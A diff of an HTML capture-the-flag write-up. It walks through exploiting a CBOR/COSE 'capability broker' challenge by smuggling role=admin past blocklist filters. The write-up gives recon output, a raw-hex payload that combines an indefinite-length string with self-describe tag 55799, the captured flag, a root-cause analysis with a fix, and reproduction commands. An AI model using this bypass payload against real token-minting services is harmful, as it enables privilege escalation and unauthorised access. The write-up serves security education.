@@ -67,40 +67,225 @@
 
     <div class="wu-layout">
     <article class="wu-article">
-<p>A &quot;capability broker&quot; issues COSE-Sign1-style CBOR tokens (<code>header.payload.signature</code>, Ed25519) after <code>/auth/login</code>. The signature is a genuine COSE <code>Signature1</code> over the raw protected-header and payload bytes - verified locally, no canonicalization bypass available there; tampering with any byte breaks verification.</p>
-<p><code>/vault/secret/flag</code> requires <code>role == &quot;admin&quot;</code>. The real attack surface is <code>POST /auth/mint</code>, an undocumented method-specific route that merges attacker-supplied <code>extra_claims</code> into a freshly re-signed token, subject to three filters: (A) a raw-byte blocklist for literal strings like <code>admin</code>; (B) a decoded-value blocklist (case-insensitive scan of decoded string values); (C) a semantic check that a text-string <code>role</code> must equal <code>&quot;user&quot;</code> (non-string &quot;structured claim objects&quot; are allowed through).</p>
-<h2 id="exploit-two-cbor-canonicalization-tricks-combined"><a class="wu-anchor" href="#exploit-two-cbor-canonicalization-tricks-combined" aria-hidden="true">#</a>Exploit - two CBOR canonicalization tricks combined</h2>
-<ol>
-<li><strong>Indefinite-length string to beat filter A:</strong> encode <code>&quot;admin&quot;</code> as an indefinite-length CBOR text string split into chunks (<code>7f 63 &quot;adm&quot; 62 &quot;in&quot; ff</code>) - the raw bytes never contain the contiguous ASCII <code>admin</code>, so the byte-level blocklist misses it.</li>
-<li><strong>CBOR tag 55799 (self-describe) to beat filters B and C:</strong> wrapping the value in tag <code>55799</code> makes the mint filter treat the claim as a structured object (skipping the string-role check and the value-literal scan), while the final CBOR decoder that builds the real token payload transparently <strong>unwraps</strong> the tag back to the bare string <code>&#39;admin&#39;</code>.</li>
-</ol>
-<figure class="wu-code wu-code-output" data-lines="3">
+<h2 id="1-recon"><a class="wu-anchor" href="#1-recon" aria-hidden="true">#</a>1. Recon</h2>
+<p>The root path advertises a two-service &quot;capability broker&quot;:</p>
+<figure class="wu-code wu-code-output" data-lines="8">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
         <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-1"><code class="language-text">map(2):
-  &quot;role&quot; -&gt; tag55799( indef(&quot;adm&quot;+&quot;in&quot;) )     # decodes to &quot;admin&quot;, raw bytes clean
-  &quot;caps&quot; -&gt; [&quot;read:vault&quot;]</code></pre>
+      <pre id="code-1"><code class="language-text">$ curl -s https://isfcrpesu-canonical-sin.chals.io/
+Capability Broker
+
+Routes:
+  /auth/*   -&gt; auth-gw
+  /vault/*  -&gt; vault-api
+
+Start with:  POST /auth/login  { &quot;username&quot;: &quot;guest&quot;, &quot;password&quot;: &quot;guest123&quot; }</code></pre>
       
-    </figure><p>The broker re-signs this, producing a token that decodes to <code>{&#39;role&#39;:&#39;admin&#39;, &#39;caps&#39;:[&#39;read:vault&#39;], ...}</code>.</p>
+    </figure><p>Logging in returns a <strong>CBOR / COSE-Sign1 style</strong> token - three base64url parts
+(<code>header.payload.signature</code>), where header and payload are CBOR maps:</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">POST /auth/login <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;guest&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;guest123&quot;</span><span class="hljs-punctuation">}</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">-&gt; <span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;token&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;b64u&gt;.&lt;b64u&gt;.&lt;b64u&gt;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;expires_in&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">900</span><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><p>Decoding the parts (cbor2):</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">header : { 1: -8, 4: &quot;main-2026-01&quot; }      # 1=alg (COSE EdDSA), 4=kid
+payload: { &quot;sub&quot;:&quot;guest&quot;, &quot;iat&quot;:..., &quot;exp&quot;:..., &quot;role&quot;:&quot;user&quot;, &quot;caps&quot;:[&quot;read:profile&quot;] }
+signature: 64 bytes</code></pre>
+      
+    </figure><p><code>GET /auth/keys</code> publishes the verification key:</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">json</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-json"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;keys&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;kty&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;OKP&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;crv&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Ed25519&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;use&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;EdDSA&quot;</span><span class="hljs-punctuation">,</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">          <span class="hljs-attr">&quot;kid&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;main-2026-01&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;j0TFvgtX-921XWIiHxkYnbOIWqEfris21TcpXjF0IJI&quot;</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span></span></span></code></pre>
+      
+    </figure><p>The signature is a genuine <strong>COSE <code>Signature1</code></strong> structure over the <em>raw</em>
+protected-header and payload bytes:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">Sig_structure = CBOR([&quot;Signature1&quot;, hdr_bytes, b&quot;&quot;, payload_bytes])</code></pre>
+      
+    </figure><p>This was confirmed by reproducing the Ed25519 verification locally. Tampering
+with any byte (header, payload, or signature) yields <code>bad signature</code>; the
+validator does <strong>not</strong> canonicalize before verifying, so there is no signature
+forgery available. The attack is elsewhere.</p>
+<h2 id="2-mapping-the-vault"><a class="wu-anchor" href="#2-mapping-the-vault" aria-hidden="true">#</a>2. Mapping the vault</h2>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-text">GET /vault/list
+{&quot;entries&quot;:[
+  {&quot;name&quot;:&quot;welcome&quot;,&quot;requires_cap&quot;:&quot;read:profile&quot;,&quot;requires_role&quot;:&quot;user&quot;},
+  {&quot;name&quot;:&quot;flag&quot;,&quot;requires_cap&quot;:&quot;read:vault&quot;,&quot;requires_role&quot;:&quot;admin&quot;}]}</code></pre>
+      
+    </figure><p>The read route is not linked anywhere and had to be found by fuzzing
+(<code>/vault/secret/&lt;name&gt;</code>):</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-text">GET /vault/secret/welcome  (guest token) -&gt; &quot;Welcome, guest. ...&quot;
+GET /vault/secret/flag     (guest token) -&gt; 403
+   {&quot;error&quot;:&quot;forbidden: role must be 'admin'&quot;,&quot;your_role_repr&quot;:&quot;'user'&quot;}</code></pre>
+      
+    </figure><p>So the gate is <code>role == &#39;admin&#39;</code> (plus capability <code>read:vault</code>).</p>
+<h2 id="3-the-real-surface-authmint"><a class="wu-anchor" href="#3-the-real-surface-authmint" aria-hidden="true">#</a>3. The real surface: <code>/auth/mint</code></h2>
+<p>A method-specific route missed by GET fuzzing:</p>
 <figure class="wu-code wu-code-output" data-lines="2">
       <figcaption>
         
         <span class="wu-code-lang">output</span>
-        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
       </figcaption>
-      <pre id="code-2"><code class="language-text">GET /vault/secret/flag -&gt; 200
+      <pre id="code-8"><code class="language-text">POST /auth/mint   (requires bearer token)
+{&quot;extra_claims_b64u&quot;:&quot;&lt;base64url(CBOR map of extra claims)&gt;&quot;}</code></pre>
+      
+    </figure><p><code>/auth/mint</code> takes the caller&#39;s base claims (<code>sub</code>, <code>iat</code>, <code>exp</code>) and merges in
+<strong>attacker-supplied claims</strong>, then re-signs a fresh token with the broker key.
+This is the capability broker &quot;minting&quot; a derived capability token - and it is
+where the vulnerability lives.</p>
+<p>The mint endpoint applies several filters to <code>extra_claims</code>:</p>
+<ul>
+<li><strong>A. Raw-byte blocklist</strong> - rejects if the literal bytes <code>admin</code>, <code>root</code>,
+<code>superuser</code>, … appear anywhere in the encoded claims:
+<code>{&quot;error&quot;:&quot;extra_claims bytes contain forbidden token \&quot;admin\&quot;&quot;}</code></li>
+<li><strong>B. Decoded-value blocklist</strong> - case-insensitive scan of decoded values:
+<code>{&quot;error&quot;:&quot;extra_claims contain a forbidden role literal&quot;}</code> (caught <code>&quot;ADMIN&quot;</code>).</li>
+<li><strong>C. Semantic role check</strong> - a <em>text string</em> role must be <code>&quot;user&quot;</code>;
+non-string &quot;structured claim objects&quot; are allowed:
+<code>{&quot;error&quot;:&quot;role \&quot;moderator\&quot; is not permitted&quot;}</code> /
+<code>{&quot;error&quot;:&quot;role must be a text string or a structured claim object&quot;}</code></li>
+</ul>
+<p>Capabilities, by contrast, are free: <code>{&quot;caps&quot;:[&quot;read:vault&quot;]}</code> mints cleanly.
+The only obstacle is getting <code>role == &quot;admin&quot;</code> past filters A/B/C.</p>
+<h2 id="4-exploit-two-cbor-canonicalization-tricks"><a class="wu-anchor" href="#4-exploit-two-cbor-canonicalization-tricks" aria-hidden="true">#</a>4. Exploit - two CBOR canonicalization tricks</h2>
+<p>The title is the hint: <em>canonical</em> CBOR. Two deviations from canonical CBOR
+each defeat a different filter, and together they smuggle <code>admin</code> through.</p>
+<h3 id="4a-indefinite-length-string-to-beat-the-byte-scan-a"><a class="wu-anchor" href="#4a-indefinite-length-string-to-beat-the-byte-scan-a" aria-hidden="true">#</a>4a. Indefinite-length string to beat the byte scan (A)</h3>
+<p>Encode <code>&quot;admin&quot;</code> as an <strong>indefinite-length</strong> CBOR text string split into chunks:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-text">7f 63 &quot;adm&quot; 62 &quot;in&quot; ff      -&gt; decodes to &quot;admin&quot;</code></pre>
+      
+    </figure><p>The raw bytes now contain <code>adm</code> and <code>in</code> but never the contiguous ASCII
+<code>admin</code>, so the byte-level blocklist (A) misses it. (A definite string
+<code>65 61646d696e</code> is rejected immediately.)</p>
+<h3 id="4b-cbor-tag-55799-to-beat-the-decoded-value-scan-b-and-the-role-check-c"><a class="wu-anchor" href="#4b-cbor-tag-55799-to-beat-the-decoded-value-scan-b-and-the-role-check-c" aria-hidden="true">#</a>4b. CBOR tag 55799 to beat the decoded-value scan (B) and the role check (C)</h3>
+<p>Tag <strong>55799</strong> is the &quot;self-describe CBOR&quot; marker. <code>cbor2</code> (and most decoders)
+transparently <strong>unwrap</strong> it to the bare value on decode:</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">cbor2.loads(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;d9d9f7&quot;</span>) + <span class="hljs-string">b&quot;\x65admin&quot;</span>)   <span class="hljs-comment"># -&gt; &#x27;admin&#x27;  (plain str)</span></span></span></code></pre>
+      
+    </figure><p>Wrapping the value in <code>55799</code> makes the mint filter treat the claim as a
+<em>structured object</em> (so the string-role check C is skipped and the value scan B
+does not see a bare string literal), while the decoder that builds the final
+token payload unwraps it back to the string <code>&#39;admin&#39;</code>.</p>
+<h3 id="4c-poisoned-extra-claims"><a class="wu-anchor" href="#4c-poisoned-extra-claims" aria-hidden="true">#</a>4c. Poisoned extra claims</h3>
+<figure class="wu-code wu-code-output" data-lines="7">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-11" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-11"><code class="language-text">map(2):
+  &quot;role&quot; -&gt; tag55799( indef(&quot;adm&quot;+&quot;in&quot;) )     # decodes to &quot;admin&quot;, raw bytes clean
+  &quot;caps&quot; -&gt; [&quot;read:vault&quot;]
+
+raw hex:
+a2 64726f6c65 d9d9f7 7f6361646d62696eff 6463617073 81 6a726561643a7661756c74
+         ^&quot;role&quot;  ^tag55799 ^indef &quot;admin&quot;  ^&quot;caps&quot;   ^[&quot;read:vault&quot;]</code></pre>
+      
+    </figure><p><code>b&quot;admin&quot; in raw</code> is <strong>False</strong> → filter A passes. The tagged item is treated as
+a structured claim → filters B/C pass. The broker re-signs it, and the token
+payload decodes to:</p>
+<figure class="wu-code" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-12" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-12"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">{<span class="hljs-string">&#x27;sub&#x27;</span>:<span class="hljs-string">&#x27;guest&#x27;</span>,<span class="hljs-string">&#x27;iat&#x27;</span>:...,<span class="hljs-string">&#x27;exp&#x27;</span>:...,<span class="hljs-string">&#x27;role&#x27;</span>:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;caps&#x27;</span>:[<span class="hljs-string">&#x27;read:vault&#x27;</span>]}</span></span></code></pre>
+      
+    </figure><h3 id="4d-claim-the-flag"><a class="wu-anchor" href="#4d-claim-the-flag" aria-hidden="true">#</a>4d. Claim the flag</h3>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-13" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-13"><code class="language-text">POST /auth/mint  -&gt; 200, new signed token (role=admin, caps=[read:vault])
+GET  /vault/secret/flag  -&gt; 200
 isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}</code></pre>
       
-    </figure><p>Root cause: <code>/auth/mint</code> performs validate-then-reserialize with a filter/decoder pair that disagrees on non-canonical CBOR - the filters assume canonical encoding (contiguous string bytes, bare values) while the serializer&#39;s full decoder normalizes tags and indefinite-length items. The fix is to canonicalize once (RFC 8949 §3.9/§4.2), validate the canonical form, and sign exactly that - rejecting tags and indefinite-length items in security-sensitive tokens.</p>
-
+    </figure><p>The flag text spells out the intended lesson: a <strong>canonical differential</strong> -
+<code>tag 55799</code> (self-describe) is the trap.</p>
+<h2 id="5-why-it-works-root-cause"><a class="wu-anchor" href="#5-why-it-works-root-cause" aria-hidden="true">#</a>5. Why it works (root cause)</h2>
+<p><code>/auth/mint</code> performs <strong>validate-then-reserialize</strong> with a decoder/filter pair
+that disagrees on non-canonical CBOR:</p>
+<ul>
+<li>The <em>filters</em> inspect raw bytes and/or decoded values under assumptions that
+hold only for canonical encodings (contiguous string bytes, bare values).</li>
+<li>The <em>serializer</em> uses a full CBOR decoder that normalizes the item (unwraps
+tag 55799, concatenates indefinite-length chunks) into a form the downstream
+<code>vault-api</code> treats as the privileged value.</li>
+</ul>
+<p>Any one of the three defences is bypassable individually; combined, the
+indefinite-length string hides the literal from the byte scan and tag 55799
+hides it from the value/type scan. The fix is to <strong>canonicalize once, validate
+the canonical form, and sign exactly that form</strong> (RFC 8949 §3.9 / §4.2), and to
+reject tags and indefinite-length items in a security-sensitive token.</p>
+<h2 id="6-reproduction"><a class="wu-anchor" href="#6-reproduction" aria-hidden="true">#</a>6. Reproduction</h2>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-14" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-14"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">pip install --break-system-packages cbor2 requests</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">python3 exploit.py</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-comment"># -&gt; isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}</span></span></span></code></pre>
+      
+    </figure>
     </article>
     <nav class="wu-toc" aria-label="On this page">
         <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
         <p class="wu-toc-h">On this page</p>
-        <ol><li><a href="#exploit-two-cbor-canonicalization-tricks-combined">Exploit - two CBOR canonicalization tricks combined</a></li></ol>
+        <ol><li><a href="#1-recon">1. Recon</a></li><li><a href="#2-mapping-the-vault">2. Mapping the vault</a></li><li><a href="#3-the-real-surface-authmint">3. The real surface: /auth/mint</a></li><li><a href="#4-exploit-two-cbor-canonicalization-tricks">4. Exploit - two CBOR canonicalization tricks</a><ol class="wu-toc-sub"><li><a href="#4a-indefinite-length-string-to-beat-the-byte-scan-a">4a. Indefinite-length string to beat the byte scan (A)</a></li><li><a href="#4b-cbor-tag-55799-to-beat-the-decoded-value-scan-b-and-the-role-check-c">4b. CBOR tag 55799 to beat the decoded-value scan (B) and the role check (C)</a></li><li><a href="#4c-poisoned-extra-claims">4c. Poisoned extra claims</a></li><li><a href="#4d-claim-the-flag">4d. Claim the flag</a></li></ol></li><li><a href="#5-why-it-works-root-cause">5. Why it works (root cause)</a></li><li><a href="#6-reproduction">6. Reproduction</a></li></ol>
       </nav>
   </div>
 
